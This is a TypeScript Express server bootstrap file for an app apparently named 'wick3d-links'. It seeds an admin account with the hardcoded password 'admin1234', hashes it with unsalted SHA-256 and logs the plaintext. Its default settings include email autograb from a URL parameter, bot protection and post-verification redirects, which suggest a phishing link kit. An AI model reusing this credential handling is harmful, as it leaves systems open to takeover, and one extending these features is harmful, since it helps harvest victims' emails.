import express, { type Request, Response, NextFunction } from "express";
import { registerRoutes } from "./routes";
import { setupVite, serveStatic, log } from "./vite";
import { storage } from "./storage";
import { db } from "./db";
import { users } from "../shared/schema";
import { eq } from "drizzle-orm";
import { createHash } from "crypto";
import { createRateLimiters } from "./middleware/rateLimiter";
import { setupAuth } from "./auth";

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
console.log('ENV:', { HOST: process.env.HOST, PORT: process.env.PORT });
// Function to check if admin account exists and create if not
async function initializeAdminAccount() {
  try {
    // Check if any users exist
    const existingUsers = await db.select().from(users);
    
    if (existingUsers.length === 0) {
      // No users exist, create admin account
      log("No admin accounts found. Creating initial admin account...");
      
      // HARDCODED PASSWORD FOR TESTING
      const initialPassword = "admin1234"; // <-- set your password here
      
      // Hash the password with a simple hash for first login
      const hashedPassword = createHash('sha256').update(initialPassword).digest('hex');
      
      // Create admin user
      await storage.createUser({
        username: "admin@wick3d-links.com",
        password: hashedPassword
      });
      
      console.log("\n========================================");
      console.log("🔐 INITIAL ADMIN ACCOUNT CREATED 🔐");
      console.log("Username: admin@wick3d-links.com");
      console.log(`Password: ${initialPassword}`);
      console.log(`Password hash (DB): ${hashedPassword}`);
      console.log("Please login and change this password immediately!");
      console.log("========================================\n");
    }
    
    // Initialize settings if needed
    const settings = await storage.getSettings();
    if (!settings) {
      await storage.updateSettings({
        redirectUrl: "https://example.com/thank-you",
        showLoadingSpinner: 1,
        loadingDuration: 3,
        successMessage: "Thank you for verifying your email address!",
        useEmailAutograb: 0,
        emailAutograbParam: "email",
        enableBotProtection: 1,
        customThankYouPage: "",
        useCustomThankYouPage: 0,
        securityLevel: 3,
        useWildcards: 1,
        encryptionSalt: Math.random().toString(36).substring(2, 15)
      });
      log("Default settings initialized");
    }
  } catch (error) {
    console.error("Error initializing admin account:", error);
  }
}

app.use((req, res, next) => {
  const start = Date.now();
  const path = req.path;
  let capturedJsonResponse: Record<string, any> | undefined = undefined;

  const originalResJson = res.json;
  res.json = function (bodyJson, ...args) {
    capturedJsonResponse = bodyJson;
    return originalResJson.apply(res, [bodyJson, ...args]);
  };

  res.on("finish", () => {
    const duration = Date.now() - start;
    if (path.startsWith("/api")) {
      let logLine = `${req.method} ${path} ${res.statusCode} in ${duration}ms`;
      if (capturedJsonResponse) {
        logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
      }

      if (logLine.length > 80) {
        logLine = logLine.slice(0, 79) + "…";
      }

      log(logLine);
    }
  });

  next();
});

(async () => {
  // Initialize admin account and settings before starting server
  await initializeAdminAccount();
  
  // Initialize rate limiters
  const rateLimiters = await createRateLimiters();
  
  // Set up authentication with sessions
  const { requireAuth } = await setupAuth(app);

  // Wrap requireAuth to ensure it matches Express middleware signature
  const requireAuthMiddleware = (req: Request, res: Response, next: NextFunction) => {
    Promise.resolve(requireAuth(req, res, next)).catch(next);
  };

  // Apply rate limiters to api routes
  app.use('/api/auth', rateLimiters.auth);
  app.use('/api/verification', rateLimiters.verification);
  app.use('/api', rateLimiters.general);
  
  const server = await registerRoutes(app, requireAuthMiddleware);

  app.use((err: any, _req: Request, res: Response, _next: NextFunction) => {
    const status = err.status || err.statusCode || 500;
    const message = err.message || "Internal Server Error";

    res.status(status).json({ message });
    throw err;
  });

  // importantly only setup vite in development and after
  // setting up all the other routes so the catch-all route
  // doesn't interfere with the other routes
  if (app.get("env") === "development") {
    await setupVite(app, server);
  } else {
    serveStatic(app);
  }

  // Use environment variables for host and port, with safe defaults
  const port = process.env.PORT ? parseInt(process.env.PORT, 10) : 5000;
  const host = process.env.HOST || "localhost";
  server.listen({
    port,
    host,
    reusePort: true,
  }, () => {
    log(`serving on ${host}:${port}`);
  });
})();
